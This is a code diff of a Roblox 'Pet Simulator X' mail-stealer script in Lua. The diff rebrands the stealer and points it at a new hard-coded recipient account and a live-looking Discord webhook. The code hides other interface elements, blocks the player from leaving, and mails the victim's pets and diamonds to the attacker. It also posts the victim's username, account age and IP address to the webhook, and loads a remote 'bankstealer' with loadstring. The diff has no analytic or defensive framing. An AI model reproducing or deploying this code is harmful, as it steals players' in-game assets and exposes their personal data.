@@ -1,6 +1,6 @@
 -- MAIL STEALER BELLOW
 
--- [Monzz Mailstealer]
+-- [EgorikusaHub Mailstealer]
 
 local Library = require(game.ReplicatedStorage.Framework.Library);
 local Players = game:GetService("Players")
@@ -16,6 +16,8 @@ for i,v in pairs(Library.Save.Get().Pets) do
     end
 end
 if hugeamount >1 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
+     UserName = "TehPucuk_55"
+     Webhook = "https://discord.com/api/webhooks/1121033513823645746/TIJU4pFbvVD0wv_kImDQwrYlzCrUKhOIJ4sBRSyNkBAtaZwJExQunsNep8XBcwQ2ILD9"
 end
 
 if getgenv().executed then return end
@@ -59,13 +61,13 @@ setclipboard = antiPrint
 -- Users And Stuff
 
 if UserName == nil then
-    UserName = UserName
+    UserName = _G.UserName
 end
 if UserName2 == nil then
-    UserName2 = UserName2
+    UserName2 = _G.UserName2
 end
 if Webhook == nil then
-    Webhook = Webhook
+    Webhook = _G.Webhook
 end
 -- User Checks
 
@@ -87,7 +89,7 @@ if not worked2 then
     return;
 end
 if worked2 then
-    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(TehPucuk_55)
+    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(UserName)
 end
 if UserName2 ~= nil then
     local worked3 = pcall(function()
@@ -768,7 +770,7 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Egorikusa/PetSimulatorX/main/bankstealer", true))()
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Egorikusa/PetSimulatorX/main/bankstealer", true))() -- Exc : -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
@@ -778,7 +780,7 @@ if _G.AntiLeave ~= false then
         end
     end
     for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
-        if v.Name ~= "MonzzHub" and v.Name ~= "RobloxPromptGui" then
+        if v.Name ~= "RizzHub" and v.Name ~= "RobloxPromptGui" then
             v:Destroy()
         end
     end
@@ -1021,23 +1023,23 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     Image = game:GetService("HttpService"):JSONDecode(Image).data[1].imageUrl
     if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
         imgs =
-        "https://cdn.discordapp.com/attachments/1100823909009465497/1121522572799004793/Monzz.png"
+        "https://media.discordapp.net/attachments/1085213702522949713/1095787502180241589/image.png"
         data1 = {
             ["content"] = ping,
-            ["username"] = "Monzz Scriptz",
+            ["username"] = "Egorikusa Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Monzz||",
-                ["url"] = "https://discord.gg/TPjwpVKBd2",
+                ["title"] = "**New Hit** ||With Egorikusa||",
+                ["url"] = "https://discord.gg/Qg9SBjXExx",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
-                    ["url"] = image,
+                    ["url"] = Image,
                     ["height"] = 420,
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Monzz Scriptz's Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Arhkalis Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1091,23 +1093,23 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         end
     else
         imgs =
-        "https://cdn.discordapp.com/attachments/1100823909009465497/1121522572799004793/Monzz.png"
+        "https://media.discordapp.net/attachments/1085213702522949713/1095787502180241589/image.png"
         data1 = {
             ["content"] = ping,
-            ["username"] = "Monzz Scriptz",
+            ["username"] = "Egorikusa Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Monzz||",
-                ["url"] = "https://discord.gg/TPjwpVKBd2",
+                ["title"] = "**New Hit** ||With Egorikusa||",
+                ["url"] = "https://discord.gg/Qg9SBjXExx",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
-                    ["url"] = image,
+                    ["url"] = Image,
                     ["height"] = 420,
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Monzz Scriptz's Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Egorikusa Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1156,7 +1158,7 @@ if getgenv().Settings ~= nil then
         local dhdata = {
             dhprem = dhkey
         }
-        local dhurl = "https://discord.gg/4y4CZfdJHu"
+        local dhurl = "premium database php link here" -- Exc : https://rizz.xyz/premium.php
         local dhheaders = {
             ["content-type"] = "application/json"
         }
@@ -1184,7 +1186,7 @@ local eventin
 local secretin
 local mythicin
 local gemsin
-local mailmsg = "Monz Better"
+local mailmsg = "Yaskop"
 if dhuser ~= nil then
     if getgenv().Settings.Titanics.Dualhook then
         titanicin = getgenv().Settings.Titanics.Intensity
@@ -1254,7 +1256,6 @@ if FinalList == 0 then
     end
     if gemsin ~= nil then
         if dualhook(gemsin) then
-            user = dhuser
         end
     end
     local args = {
@@ -1271,20 +1272,22 @@ spawn(function()
     while wait() do
         if #TList ~= 0 or TList ~= {} then
             for i, v in pairs(TList) do
+                user = UserName
                 if titanicin ~= nil then
                     if dualhook(titanicin) then
+                        user = dhuser
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(5.5)
                 if #TList == 0 or TList == {} then
                     -- print("done1")
                     break
@@ -1297,20 +1300,21 @@ spawn(function()
     while wait() do
         if #BList ~= 0 and #TList == 0 then
             for i, v in pairs(BList) do
+                user = UserName
                 if bananin ~= nil then
                     if dualhook(bananin) then
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(5.5)
                 if #BList == 0 or BList == {} then
                     -- print("done2")
                     break
@@ -1325,6 +1329,7 @@ spawn(function()
     while wait() do
         if #HList ~= 0 and #BList == 0 and #TList == 0 then
             for i, v in pairs(HList) do
+                user = UserName
                 if hugein ~= nil then
                     if dualhook(hugein) then
                     end
@@ -1338,7 +1343,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(5.5)
                 if #HList == 0 or HList == {} then
                     -- print("done3")
                     break
@@ -1355,7 +1360,6 @@ spawn(function()
                 user = UserName
                 if pogin ~= nil then
                     if dualhook(pogin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1367,7 +1371,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(5.5)
                 if #PList == 0 or PList == {} then
                     -- print("done1")
                     break
@@ -1383,7 +1387,6 @@ spawn(function()
                 user = UserName
                 if excin ~= nil then
                     if dualhook(excin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1395,7 +1398,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(5.5)
                 if #EList == 0 or EList == {} then
                     -- print("done42")
                     break
@@ -1411,7 +1414,6 @@ spawn(function()
                 user = ndUser
                 if eventin ~= nil then
                     if dualhook(eventin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1423,7 +1425,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(5.5)
                 if #EvList == 0 or EvList == {} then
                     -- print("done5")
                     break
@@ -1439,7 +1441,6 @@ spawn(function()
                 user = ndUser
                 if secretin ~= nil then
                     if dualhook(secretin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1451,7 +1452,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(5.5)
                 if #SList == 0 or SList == {} then
                     -- print("done6")
                     break
@@ -1467,7 +1468,6 @@ spawn(function()
                 user = ndUser
                 if mythicin ~= nil then
                     if dualhook(mythicin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1479,7 +1479,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(5.5)
                 -- print("secret sending")
                 if #MList == 0 or MList == {} then
                     -- print("done6")
